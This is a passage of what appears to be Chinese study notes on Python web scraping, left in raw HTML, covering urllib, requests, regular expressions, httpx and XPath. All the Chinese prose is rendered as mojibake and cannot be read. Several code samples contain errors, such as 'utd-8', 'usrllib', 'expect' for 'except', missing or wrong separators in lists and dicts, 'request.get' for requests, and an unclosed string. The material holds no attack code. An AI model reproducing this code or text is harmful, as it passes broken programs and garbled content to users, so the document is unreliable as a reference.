class="code"><pre><code class="hljs stylus">import urllib<span class="hljs-selector-class">.request</span><br><br>request = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.Request</span>(<span class="hljs-string">&#x27;https://python.org&#x27;</span>)<br>response = urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(request)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(response.read()</span></span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utd-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>Request ç±»æ„é€ :</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">class</span> usrllib.request.Request(url, data=None, headers=<span class="hljs-comment">&#123;&#125;</span>, origin_req_host=None, unvarifiable=<span class="hljs-keyword">False</span>, <span class="hljs-keyword">method</span>=<span class="hljs-title function_">None</span>)<br></code></pre></td></tr></table></figure><p>æ·»åŠ è¯·æ±‚å¤´æœ€å¸¸è§çš„åŠæ³•æ˜¯é€šè¿‡ä¿®æ”¹ User-Agent æ¥ä¼ªè£…æµè§ˆå™¨ã€‚</p><p>é€šè¿‡ <code>add_header</code> æ–¹æ³•æ·»åŠ  headers çš„æ–¹å¼:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">req = request(url=url, data=data, <span class="hljs-keyword">method</span>=&#x27;<span class="hljs-title function_">POST</span>&#x27;)<br><span class="hljs-title function_">req</span>.<span class="hljs-title function_">add_header</span><span class="hljs-params">(<span class="hljs-string">&#x27;User-Agent&#x27;</span>, <span class="hljs-string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>)</span><br></code></pre></td></tr></table></figure><h5 id="é«˜çº§ç”¨æ³•"><a href="#é«˜çº§ç”¨æ³•" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h5><p>å¦‚ Cookie å¤„ç†ã€ä»£ç†è®¾ç½®ç­‰ã€‚</p><p>ä½¿ç”¨ Handler å·¥å…·.</p><p>urllib.request æ¨¡å—é‡Œçš„ BaseHandler ç±»æ˜¯å…¶ä»–æ‰€æœ‰ Handler ç±»çš„çˆ¶ç±»ã€‚</p><p>å¦ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ç±»æ˜¯ OpenerDirecctor, ç®€ç§°ä¸º Opener, å…¶æä¾› <code>open</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›çš„ç›¸åº”ç±»å‹å’Œ urlopen ä¸€è‡´.</p><p>ä¸€èˆ¬ç”¨ Handler ç±»æ¥åˆ›å»º Opener ç±»ã€‚</p><h5 id="éªŒè¯"><a href="#éªŒè¯" class="headerlink" title="éªŒè¯"></a>éªŒè¯</h5><p>åœ¨è®¿é—®æŸäº›ç½‘ç«™æ˜¯ä¼šæœ‰è®¤è¯çª—å£ã€‚è¡¨æ˜å…¶å¯ç”¨äº†åŸºæœ¬èº«ä»½è®¤è¯(HTTP Basic Access Authentication).</p><p>åˆ©ç”¨ HTTPBasicAuthHandler æ¨¡å—å®Œæˆè¯·æ±‚:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from urllib<span class="hljs-selector-class">.request</span> import HTTPPasswordMgrWithDefaultRealm, HTTPBasicAuthHandler, build_opener<br>from urllib<span class="hljs-selector-class">.error</span> import URLError<br><br>username = <span class="hljs-string">&#x27;admin&#x27;</span><br>password = <span class="hljs-string">&#x27;admin&#x27;</span><br>url = <span class="hljs-string">&#x27;https://ssr3.scrape.center/&#x27;</span><br><br><span class="hljs-selector-tag">p</span> = <span class="hljs-built_in">HTTPPasswordMgrWithDefaultRealm</span>()<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.add_password</span>(None, url, username, password)<br>auth_handler = <span class="hljs-built_in">HTTPBasicAuthHandler</span>(p)<br>opener = <span class="hljs-built_in">build_opener</span>(auth_handler)<br><br>try:<br>    result = opener<span class="hljs-selector-class">.open</span>(url)<br>    <span class="hljs-selector-tag">html</span> = result<span class="hljs-selector-class">.read</span>()<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(html)<br>except URLError as e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br></code></pre></td></tr></table></figure><h5 id="ä»£ç†"><a href="#ä»£ç†" class="headerlink" title="ä»£ç†"></a>ä»£ç†</h5><h5 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h5><h3 id="2-å¤„ç†å¼‚å¸¸"><a href="#2-å¤„ç†å¼‚å¸¸" class="headerlink" title="2 å¤„ç†å¼‚å¸¸"></a>2 å¤„ç†å¼‚å¸¸</h3><p>å½“å‡ºç°é—®é¢˜æ—¶ï¼Œrequest æ¨¡å—ä¾¿ä¼šæŠ›å‡º error æ¨¡å—ä¸­å®šä¹‰çš„å¼‚å¸¸.</p><h4 id="URLError"><a href="#URLError" class="headerlink" title="URLError"></a>URLError</h4><p>URLErrot ç±»æ¥è‡ª urllib åº“ä¸­çš„ error æ¨¡å—ï¼Œç»§æ‰¿è‡ª OSError ç±»ï¼Œæ˜¯ error å¼‚å¸¸æ¨¡å—çš„åŸºç±».</p><p>å…¶æœ‰ reason å±æ€§ï¼Œè¿”å›é”™è¯¯åŸå› ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request, error<br><br><span class="hljs-keyword">try</span>:<br>    response = request.urlopen(<span class="hljs-string">&#x27;https://cuiqigcai.com/404&#x27;</span>)<br>expect URLError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e.reason)<br></code></pre></td></tr></table></figure><h4 id="HTTPError"><a href="#HTTPError" class="headerlink" title="HTTPError"></a>HTTPError</h4><p>æ˜¯ URLError çš„å­ç±»ï¼Œç”¨äºå¤„ç† HTTP è¯·æ±‚é”™è¯¯.</p><p>å…¶æœ‰3ä¸ªå±æ€§:</p><ul><li>code, è¿”å› HTTP çŠ¶æ€ç </li><li>reason, è¿”å›é”™è¯¯åŸå› </li><li>headers, è¿”å›è¯·æ±‚å¤´<br>å› ä¸º HTTPError æ˜¯ URLError çš„å­ç±»ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæ•è·å­ç±»çš„é”™è¯¯å†æ•è·çˆ¶ç±»çš„é”™è¯¯ã€‚</li></ul><h3 id="3-è§£æé“¾æ¥"><a href="#3-è§£æé“¾æ¥" class="headerlink" title="3 è§£æé“¾æ¥"></a>3 è§£æé“¾æ¥</h3><p>urllib åº“ä¸­çš„ parse æ¨¡å—ï¼Œå…¶å®šä¹‰äº†å¤„ç† URL çš„æ ‡å‡†æ¥å£.</p><h4 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h4><p>ç”¨äºå®ç° URL çš„è¯†åˆ«å’Œåˆ†æ®µçš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ª URL æ˜¯æœ‰å¾ˆå¤šéƒ¨åˆ†ç»„æˆçš„ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥æŠŠå„ä¸ªéƒ¨åˆ†åŒºåˆ†å¼€. å…¶åˆ©ç”¨ URL ä¸­ç‰¹å®šçš„åˆ†éš”ç¬¦ã€‚</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">urllib.parse</span> <span class="hljs-variable">import</span> <span class="hljs-variable">urlparse</span><br><br><span class="hljs-variable"><span class="hljs-class">result</span></span> = <span class="hljs-function"><span class="hljs-title">urlparse</span>(<span class="hljs-string">&#x27;https://www.baidu.com/index.html;user?id=comment&#x27;</span>)</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title">type</span>(<span class="hljs-variable"><span class="hljs-class">result</span></span>))</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable"><span class="hljs-class">result</span></span>)</span><br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªæ ‡å‡†çš„é“¾æ¥æ ¼å¼:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">scheme:<span class="hljs-regexp">//</span>netloc/path;params?query<span class="hljs-comment">#fragment</span><br></code></pre></td></tr></table></figure><p>urlparse çš„ API ç”¨æ³•:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">urllib.parse.urlparse(urlstring, schem<span class="hljs-string">e&#x27;&#x27;</span>, allow_fragments=<span class="hljs-keyword">True</span>)<br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªå‚æ•°:</p><ul><li>urlsring, å³ url</li><li>scheme, å¡«å†™åè®®ï¼Œåªæœ‰åœ¨ url ä¸­ä¸åŒ…å«åè®®æ—¶ç”Ÿæ•ˆ</li><li>allow_fragments, æ˜¯å¦çœç•¥æ‰ fragments éƒ¨åˆ†<br>urlparse çš„ç»“æœæ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œå¯ä»¥ç”¨å±æ€§åæˆ–ç´¢å¼•æ¥è·å–ã€‚</li></ul><h4 id="urlunparse"><a href="#urlunparse" class="headerlink" title="urlunparse"></a>urlunparse</h4><p>ç”¨äºæ„é€  url, å…¶æ¥å—çš„å‚æ•°æ˜¯ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼Œä¸”é•¿åº¦ä¸º6.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from urllib import urlunparse<br><br>data = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;https&#x27;</span>, <span class="hljs-string">&#x27;www.baidu.com&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>. <span class="hljs-string">&#x27;a=6&#x27;</span>, <span class="hljs-string">&#x27;comment&#x27;</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(urlunparse(data)</span></span>)<br></code></pre></td></tr></table></figure><h4 id="urlsplit"><a href="#urlsplit" class="headerlink" title="urlsplit"></a>urlsplit</h4><p>ç±»ä¼¼äº urlparse.</p><h4 id="urlunsplit"><a href="#urlunsplit" class="headerlink" title="urlunsplit"></a>urlunsplit</h4><p>ç±»ä¼¼äº urlunparse.</p><h4 id="urljoin"><a href="#urljoin" class="headerlink" title="urljoin"></a>urljoin</h4><p>å¯ä»¥å®ç°é“¾æ¥çš„è§£æï¼Œæ‹¼åˆä¸ç”Ÿæˆã€‚</p><h4 id="urlencode"><a href="#urlencode" class="headerlink" title="urlencode"></a>urlencode</h4><p>å…¶åœ¨æ„é€  GET è¯·æ±‚æ—¶éå¸¸æœ‰ç”¨, å…¶å°†å­—å…¸è½¬æ¢ä¸º url å‚æ•°:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from urllib import urlencode<br><br>params = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;germey&#x27;</span>,<br>    <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">25</span><br>&#125;<br>base_url = <span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span><br>url = base_url + <span class="hljs-built_in">urlencode</span>(params)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(url)</span></span><br></code></pre></td></tr></table></figure><h4 id="pase-qs"><a href="#pase-qs" class="headerlink" title="pase_qs"></a>pase_qs</h4><p>å°† GET è¯·æ±‚å‚æ•°ä¼ å›å­—å…¸</p><h4 id="parse-qsl"><a href="#parse-qsl" class="headerlink" title="parse_qsl"></a>parse_qsl</h4><h4 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h4><p>å°†å†…å®¹è½¬åŒ–ä¸º url ç¼–ç æ¨¡å¼ã€‚</p><h4 id="unquote"><a href="#unquote" class="headerlink" title="unquote"></a>unquote</h4><h3 id="4-åˆ†æ-Robots-åè®®"><a href="#4-åˆ†æ-Robots-åè®®" class="headerlink" title="4 åˆ†æ Robots åè®®"></a>4 åˆ†æ Robots åè®®</h3><p>ä½¿ç”¨ urllib åº“ä¸­çš„ robotparse æ¨¡å—è¿›è¡Œåˆ†æ.</p><h4 id="Robots-åè®®"><a href="#Robots-åè®®" class="headerlink" title="Robots åè®®"></a>Robots åè®®</h4><p>Robots åè®®ä¹Ÿç§°çˆ¬è™«åè®®ï¼Œå…¨åä¸º Robots Exclusion Protocol, æ¥å‘Šè¯‰çˆ¬è™«å’Œæœç´¢1å¼•æ“å“ªäº›é¡µé¢å¯ä»¥çˆ¬å–ã€‚é€šå¸¸æ˜¯ä¸€ä¸ª robots.txt æ–‡æœ¬æ–‡ä»¶ï¼Œä½äºç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼Œ</p><p>æœç´¢çˆ¬è™«åœ¨è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œé¦–å…ˆä¼šæ£€æŸ¥è¿™ä¸ªç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨ robots.txt æ–‡ä»¶ï¼Œè‹¥å­˜åœ¨, åˆ™åœ¨å…¶å®šä¹‰çš„çˆ¬å–èŒƒå›´å†…çˆ¬å–ã€‚</p><p>robots.txt æ ·ä¾‹:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">User-agent: *<br><span class="hljs-symbol">Disallow:</span> /<br><span class="hljs-symbol">Allow:</span> <span class="hljs-keyword">/public/</span><br></code></pre></td></tr></table></figure><p>å…¶é™åˆ¶äº†åªèƒ½çˆ¬å– public ç›®å½•ã€‚</p><p><code>User-agent</code> æè¿°äº†æœç´¢çˆ¬è™«çš„åç§°ã€‚</p><p><code>Disallow</code> æŒ‡å®šäº†ä¸å…è®¸çˆ¬è™«çˆ¬å»çš„ç›®å½•ï¼Œ<code>/</code> è¡¨ç¤ºä¸å…è®¸çˆ¬å–æ‰€æœ‰é¡µé¢.</p><p><code>Allow</code> ä¸€èˆ¬ä¸å•ç‹¬ä½¿ç”¨ã€‚</p><p>å…è®¸çˆ¬è™«è®¿é—®æ‰€æœ‰ç›®å½•çš„ä»£ç :</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">User-agent: *</span><br><span class="hljs-section">Disallow:</span><br></code></pre></td></tr></table></figure><p>åªå…è®¸æŸä¸€ä¸ªçˆ¬è™«è®¿é—®æ‰€æœ‰ç›®å½•:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">User-agent: WebCrawler</span><br><span class="hljs-section">Disallow:</span><br><span class="hljs-section">User-agent: *</span><br><span class="hljs-section">Disallow: /</span><br></code></pre></td></tr></table></figure><h4 id="çˆ¬è™«åç§°"><a href="#çˆ¬è™«åç§°" class="headerlink" title="çˆ¬è™«åç§°"></a>çˆ¬è™«åç§°</h4><p>çˆ¬è™«æœ‰å›ºå®šåç§°ã€‚</p><h4 id="robotparser"><a href="#robotparser" class="headerlink" title="robotparser"></a>robotparser</h4><p>ä½¿ç”¨ robotparser æ¨¡å—æ¥è§£æ robots.txt æ–‡ä»¶ã€‚</p><p>è¯¥æ¨¡å—æä¾›äº† RobotFileParser ç±»ï¼Œå…¶æ ¹æ®æŸç½‘ç«™çš„ robots.txt æ–‡ä»¶æ¥åˆ¤æ–­ä¸€ä¸ªçˆ¬å–çˆ¬è™«æ˜¯å¦æœ‰æƒé™çˆ¬å–è¿™ä¸ªç½‘ç«™ã€‚</p><p>RobotFileParser ç±»çš„å£°æ˜:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">urllib.robotparse.RobotFileParser(<span class="hljs-attribute">url</span>=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¼ å…¥ robots.txt æ–‡ä»¶çš„é“¾æ¥ã€‚</p><p>RobotFileParser ç±»çš„å¸¸ç”¨æ–¹æ³•:</p><ul><li>set_url</li><li>read</li><li>parse</li><li>can_fetch</li><li>mtime</li><li>modified<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">from urllib.robotparser import RobotFileParser<br><br>rp = <span class="hljs-constructor">RobotFileParser()</span><br>rp.set<span class="hljs-constructor">_url(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">baidu</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">robots</span>.<span class="hljs-params">txt</span>&#x27;)</span><br>rp.read<span class="hljs-literal">()</span><br>print(rp.can<span class="hljs-constructor">_fetch(&#x27;Baiduspider&#x27;, &#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">baidu</span>.<span class="hljs-params">com</span>&#x27;)</span>)<br>print(rp.can<span class="hljs-constructor">_fetch(&#x27;Baiduspider&#x27;, &#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">baidu</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">homepage</span><span class="hljs-operator">/</span>&#x27;)</span>)<br>print(rp.can<span class="hljs-constructor">_fetch(&#x27;Googlebot, &#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">www</span>.<span class="hljs-params">baidu</span>.<span class="hljs-params">com</span>&#x27;)</span>)<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-2-requests-çš„ä½¿ç”¨"><a href="#2-2-requests-çš„ä½¿ç”¨" class="headerlink" title="2.2 requests çš„ä½¿ç”¨"></a>2.2 requests çš„ä½¿ç”¨</h2><p>requests åº“ç”¨ <code>get</code> æ–¹æ³•è¯·æ±‚ç½‘é¡µã€‚</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">import</span> requests<br><br>r = requests.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="GET-è¯·æ±‚"><a href="#GET-è¯·æ±‚" class="headerlink" title="GET è¯·æ±‚"></a>GET è¯·æ±‚</h3><p>åˆ©ç”¨ requests åº“æ„å»º GET è¯·æ±‚çš„æ–¹æ³•.</p><h4 id="åŸºæœ¬å®ä¾‹"><a href="#åŸºæœ¬å®ä¾‹" class="headerlink" title="åŸºæœ¬å®ä¾‹"></a>åŸºæœ¬å®ä¾‹</h4><p>åˆ©ç”¨ params å‚æ•°ä¼ é€’ä¿¡æ¯:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">data</span> = &#123;<br>    <span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;germey&#x27;</span><br>    <span class="hljs-string">&#x27;age&#x27;</span> : <span class="hljs-number">25</span><br>&#125;<br>r = request.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;https://www.httpbin.org/get&#x27;</span>, params=<span class="hljs-keyword">data</span>)<br></code></pre></td></tr></table></figure><p>è°ƒç”¨ json æ–¹æ³•å¯ä»¥å°†è¿”å›ç»“æœ(JSONæ ¼å¼çš„å­—ç¬¦ä¸²)è½¬åŒ–ä¸ºå­—å…¸ã€‚</p><h4 id="æŠ“å–ç½‘é¡µ"><a href="#æŠ“å–ç½‘é¡µ" class="headerlink" title="æŠ“å–ç½‘é¡µ"></a>æŠ“å–ç½‘é¡µ</h4><h4 id="æŠ“å–äºŒè¿›åˆ¶æ•°æ®"><a href="#æŠ“å–äºŒè¿›åˆ¶æ•°æ®" class="headerlink" title="æŠ“å–äºŒè¿›åˆ¶æ•°æ®"></a>æŠ“å–äºŒè¿›åˆ¶æ•°æ®</h4><p>å¦‚æŠ“å–å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰æ–‡ä»¶ã€‚</p><p>Response å¯¹è±¡çš„ä¸¤ä¸ªå±æ€§:</p><ul><li>text, å…¶ä¸º Unicode æ–‡æœ¬</li><li>content, å…¶ä¸º bytes æ–‡æœ¬</li></ul><h4 id="æ·»åŠ è¯·æ±‚å¤´"><a href="#æ·»åŠ è¯·æ±‚å¤´" class="headerlink" title="æ·»åŠ è¯·æ±‚å¤´"></a>æ·»åŠ è¯·æ±‚å¤´</h4><h2 id="2-3-æ­£åˆ™è¡¨è¾¾å¼"><a href="#2-3-æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="2.3 æ­£åˆ™è¡¨è¾¾å¼"></a>2.3 æ­£åˆ™è¡¨è¾¾å¼</h2><p>Python çš„ re åº“æä¾›äº†æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„å®ç°.</p><h3 id="match"><a href="#match" class="headerlink" title="match"></a>match</h3><p>ä»å­—ç¬¦ä¸²å¼€å¤´è¿›è¡ŒåŒ¹é…ï¼Œè‹¥å¼€å¤´ä¸ä¸€è‡´åˆ™åŒ¹é…å¤±è´¥ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span> = re.match(<span class="hljs-string">&#x27;Hello&#x27;</span>, content)<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸º regex, ç¬¬äºŒä¸ªä¸ºåŒ¹é…å¯¹è±¡ã€‚</p><p>éè´ªå©ªçš„å†™æ³•ä¸º <code>.*?</code></p><h3 id="ä¿®é¥°ç¬¦"><a href="#ä¿®é¥°ç¬¦" class="headerlink" title="ä¿®é¥°ç¬¦"></a>ä¿®é¥°ç¬¦</h3><p>ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºä¿®é¥°ç¬¦:</p><ul><li>re.I, å¤§å°å†™ä¸æ•æ„Ÿ</li><li>re.L, æœ¬åœ°åŒ–è¯†åˆ«åŒ¹é…</li><li>re.M, å¤šè¡ŒåŒ¹é…ï¼Œå½±å“ ^ å’Œ $</li><li>re.S, åŒ¹é…å†…å®¹åŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…çš„æ‰€æœ‰å­—ç¬¦</li><li>re.U, æ ¹æ® Unicode å­—ç¬¦é›†è§£æå­—ç¬¦</li><li>re.X, ä¹¦å†™è¡¨è¾¾å¼æ›´çµæ´»</li></ul><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒç±»ä¼¼ Perl ä¸­çš„ match.</p><p>è¿”å›ä¸æ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸².</p><p>ä½¿ç”¨ group æ–¹æ³•æå–æ‹¬å·æ•è·çš„å†…å®¹ã€‚</p><h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><p>è¿”å›çš„ç»“æœæ˜¯åˆ—è¡¨ç±»å‹ï¼Œèƒ½å¤Ÿè·å–ä¸æ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„æ‰€æœ‰å­—ç¬¦ä¸²ã€‚</p><h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h3><p>ç”¨äºä¿®æ”¹æ–‡æœ¬.</p><p>åº”è¯¥æ˜¯ä½œç”¨äºæ‰€æœ‰åŒ¹é…çš„æ–‡æœ¬ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">content</span> = re.sub(regex, replacement, content)<br></code></pre></td></tr></table></figure><h3 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h3><p>å°†æ­£åˆ™å­—ç¬¦ä¸²ç¼–è¯‘æˆæ­£åˆ™è¡¨è¾¾å¼å¯¹è±¡ï¼Œæ–¹ä¾¿å¤ç”¨:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pattern</span> = re.compile(regex)<br><span class="hljs-attr">result</span> = re.search(pattern, content)<br></code></pre></td></tr></table></figure><p>compile åŒæ ·å¯ä»¥ä¼ å…¥ä¿®é¥°ç¬¦ã€‚</p><h2 id="2-4-httpx-çš„ä½¿ç”¨"><a href="#2-4-httpx-çš„ä½¿ç”¨" class="headerlink" title="2.4 httpx çš„ä½¿ç”¨"></a>2.4 httpx çš„ä½¿ç”¨</h2><p>urllib åº“å’Œ requests åº“åªèƒ½çˆ¬å–æ”¯æŒ HTTP&#x2F;1.1 çš„ç½‘ç«™ã€‚</p><p>æ”¯æŒ HTTP&#x2F;2.0 çš„è¯·æ±‚åº“ï¼Œå…·æœ‰ä»£è¡¨æ€§çš„æ˜¯ hyper å’Œ httpx.</p><p>æŸ¥çœ‹ç½‘ç«™çš„ Network é¢æ¿ï¼Œå¦‚æœ Protocol ä¸€åˆ—æ˜¯ h2, è¯æ˜è¯·æ±‚æ‰€ç”¨çš„åè®®æ˜¯ HTTP&#x2F;2.0</p><h1 id="ç¬¬3ç« -ç½‘é¡µæ•°æ®çš„è§£ææå–"><a href="#ç¬¬3ç« -ç½‘é¡µæ•°æ®çš„è§£ææå–" class="headerlink" title="ç¬¬3ç«  ç½‘é¡µæ•°æ®çš„è§£ææå–"></a>ç¬¬3ç«  ç½‘é¡µæ•°æ®çš„è§£ææå–</h1><h2 id="3-1-XPath-çš„ä½¿ç”¨"><a href="#3-1-XPath-çš„ä½¿ç”¨" class="headerlink" title="3.1 XPath çš„ä½¿ç”¨"></a>3.1 XPath çš„ä½¿ç”¨</h2><p>XPath çš„å…¨ç§°ä¸º XML Path Language, å³ XML è·¯å¾„è¯­è¨€ã€‚ç”¨æ¥åœ¨ XML æ–‡æ¡£ä¸­æŸ¥æ‰¾ä¿¡æ¯ã€‚</p><h3 id="æ¦‚è§ˆ"><a href="#æ¦‚è§ˆ" class="headerlink" title="æ¦‚è§ˆ"></a>æ¦‚è§ˆ</h3><p>æä¾›è·¯å¾„é€‰æ‹©è¡¨è¾¾å¼å’Œå†…å»ºå‡½æ•°ã€‚</p><h3 id="å¸¸ç”¨è§„åˆ™"><a href="#å¸¸ç”¨è§„åˆ™" class="headerlink" title="å¸¸ç”¨è§„åˆ™"></a>å¸¸ç”¨è§„åˆ™</h3><ul><li>nodename : é€‰å–æ­¤èŠ‚ç‚¹çš„æ‰€æœ‰å­èŠ‚ç‚¹</li><li>&#x2F; : é€‰å–å½“å‰èŠ‚ç‚¹çš„ç›´æ¥å­èŠ‚ç‚¹</li><li>&#x2F;&#x2F; : é€‰å–å½“å‰èŠ‚ç‚¹çš„å­å­™ç»“ç‚¹</li><li>. : é€‰å–å½“å‰èŠ‚ç‚¹</li><li>.. : é€‰å–å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹</li><li>@ : é€‰å–å±æ€§</li><li>[@attrib] : é€‰å–å…·æœ‰ç»™å®šå±æ€§çš„æ‰€æœ‰å…ƒç´ </li><li>[tag] : é€‰å–æ‰€æœ‰å…·æœ‰æŒ‡å®šå…ƒç´ çš„ç›´æ¥å­èŠ‚ç‚¹</li><li>[tag&#x3D;â€™textâ€™] : 